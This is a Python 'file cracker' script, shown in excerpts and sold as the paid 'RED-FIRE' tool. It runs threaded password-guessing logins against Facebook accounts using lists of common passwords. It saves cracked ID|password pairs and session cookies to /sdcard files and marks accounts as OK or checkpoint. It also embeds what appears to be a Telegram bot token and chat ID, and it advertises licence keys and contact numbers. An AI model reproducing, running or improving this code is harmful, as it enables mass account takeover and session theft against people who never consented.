print(('\x1b[1;31m—'*25)+'\n• TOOL BY By R3D-F1R3'+('—'*25))
import datetime;now = datetime.date.today();target = datetime.date(2025,9,12,)
if now >=target:print("𝙍𝙀𝘿-𝙁𝙄𝙍𝙀")
else:print("Test")
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys

Goldtok = '7049180419:AAER22i0RRM_M1paGrT1fIK4Z60U_ngoDng'
Goldid = '6797981875'

print('\x1b[1;31m   File cracker 🔥🔥')
...
#version = requests.get('https://api.ipify.org').text
...
logo=(f"""\x1b[1;31m
—————————————————————————
• TOOL NAME | 𝙍𝙀𝘿🝮︎︎︎︎︎︎︎𝙊𝙉𖤍𝙁𝙄𝙍𝙀♲︎︎︎🔥😘•
—————————————————————————
...
—————————————————————————
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\x1b[1;31m                  [TEST PREMIUM TOOL ]       \x1b[1;31m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\x1b[1;31m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\x1b[1;31m  
╠══[TEAM-NAME                       • \x1b[1;31m𝙍𝙀𝘿☠︎︎𝙊𝙉☠︎︎𝙁𝙄𝙍𝙀]      ║\x1b[1;31m    
\x1b[1;31m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
...
def public():
        ...
        try:
                ...
                with tred(max_workers=30) as crack_submit:
                        ...
                        print(' \x1b[1;93m😎 : \033[1;32m'+total_ids)
                        linex()
                        for user in id:
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        #clear()
                        print('\x1b[1;91m [01] \x1b[1;92mCloning File')
                        linex()
                        xd=input(' Choose > ')
                        if xd in ['1','01']:
                                ...
                                try:
                                        ...
                                        menu()
                                linex()
                                print(' \x1b[1;91m[01] \x1b[1;92m go in hack')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                print(f'\n\n\n{a26}❲ 𝟏 ❳ PASSWORD WORKING.....✅🔥 •\n{m1}❲ 𝟐 ❳ PASSWORD FOR YOU👀 • \n');linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        lim=int(total_ids)
                                        print(' \x1b[1;93mID IN FILE : \033[1;32m'+total_ids)
                                        print("\033[1;32m IS CLONING🔥")
                                        print("\033[1;34m PLEASE WHITE👀")
                                        linex()
                                ...
                                os.system(f'xdg-open https://www.youtube.com/@RedGaming-s');menu()
                        elif xd in ['7','07']:
                                crack()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/ordinary.sagor.ff?mibextid=ZbWKwL/');menu()
                        elif xd in ['9','09']:
                                sep()  
                        elif xd in ['10','10']:
                                double()                              
...
def za():
    ...
    if myid in str(body):
        ...
        tp=0
        print("\33[1;37m Read note first bro...!\33[1;37m");print(logo);print (" Validity : 30Days BDT: 500");print (" validity : \33[1;37m15days= BDT: 300\n \033[1;32mFOR OUT OF COUNTRY-----------> \n \033[1;37mValidity : 30days = 5\33[1;37m\n \33[1;37m\33[37;41mNote: If You Are Free User exit this tool\33[0;0m");linex();print(" Your Key  :\n "+myid);linex();print(' KEEP DISTANCE FREE USERS');linex(); print("COME IB FOR BUY TOOL");linex();print('FACEBOOK GO ON UPDATE THEN TOOL GIVE NOT OK RESULT  \nI WILL UPDATE MY TOOL EVERY TWO DAYS \nIF YOU CLEAR YOUR TERMUX DATA AND TOOL NEED AGAIN APPROVL  \nIDEVELPER ARE NOT RESPONSIBLE  ')
        ...
        os.system("xdg-open https://wa.me/+8801406103107")
        print(" run again python RED-FIRE.py")
...
def pak():
                ...
                with tred(max_workers=30) as RED-FIRE:     
                        clear()
                        tl = str(len(user))
                        print(' ﻚﻔﻠﻣ تﺎﻳﺪﻳﺍ دﺪﻋ : \033[1;32m'+tl)
                        print(f'\033[1;32m MIZDAWI ﻪﻄﺳﺍﻮﺑ ﻞﻴﻐﺸﺗ ﻢﺗ')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def bd():
                ...
                with tred(max_workers=30) as RED-FIRE:
                        ...
                        tl = str(len(user))
                        print(' 😎 : \033[1;32m'+tl)
                        print(' \033[1;32m 𝙍𝙀𝘿-𝙁𝙄𝙍𝙀 ')
                        print(f'\033[1;32m Use airplane mode for speed up ')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire','mp40king','mp40 king','mp40 lover','mp40lover','umpking','ump king','umplover','ump lover','m10king','m10 king','m10lover','m10 lover']
                                RED-FIRE.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
...
def india():
                ...
                with tred(max_workers=30) as RED-FIRE:     
                        ...
                        print(f'\033[1;32m Use airplane mode for speed up ')
                        linex()
                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/RED-FIRE-OK.TXT")
                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/RED-FIRE-CP.TXT")
                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/RED-FIRE-COOKIE.TXT")
                        linex()
                        for psx in user:
                                ids = code+psx
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32m𝙍𝙀𝘿-𝙁𝙄𝙍𝙀🔥\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        RED-FIRE=str(session.cookies)
                        if "c_user" in RED-FIRE:
                                print('\r\r\033[1;32m [𝙍𝙀𝘿-𝙁𝙄𝙍𝙀-OK🔥✅] %s | %s'%(ids,pas))
                                bn = ('\r\r\033[1;32m [𝙍𝙀𝘿-𝙁𝙄𝙍𝙀-OK🔥✅💪✅] '+ids+' | '+pas+'\033[1;97m')
                                ...
                                open('/sdcard/𝙍𝙀𝘿-𝙁𝙄𝙍𝙀-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/𝙍𝙀𝘿-𝙁𝙄𝙍𝙀-OK🔥✅.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in RED-FIRE:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [𝙍𝙀𝘿-𝙁𝙄𝙍𝙀-CP👀💔] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [𝙍𝙀𝘿-𝙁𝙄𝙍𝙀🔥] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
def api1(ids,names,passlist):
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mTOOL BY R3D-F1R3\n[𝙍𝙀𝘿-𝙁𝙄𝙍𝙀-OK🔥✅] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝙍𝙀𝘿-𝙁𝙄𝙍𝙀-OK🔥✅.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/𝙍𝙀𝘿-𝙁𝙄𝙍𝙀CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [𝙍𝙀𝘿-𝙁𝙄𝙍𝙀-OK🔥✅] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/𝙍𝙀𝘿-𝙁𝙄𝙍𝙀-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/𝙍𝙀𝘿-𝙁𝙄𝙍𝙀_OK🔥✅.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [𝙍𝙀𝘿-𝙁𝙄𝙍𝙀-CP👀💔] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝙍𝙀𝘿-𝙁𝙄𝙍𝙀-CP👀💔.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
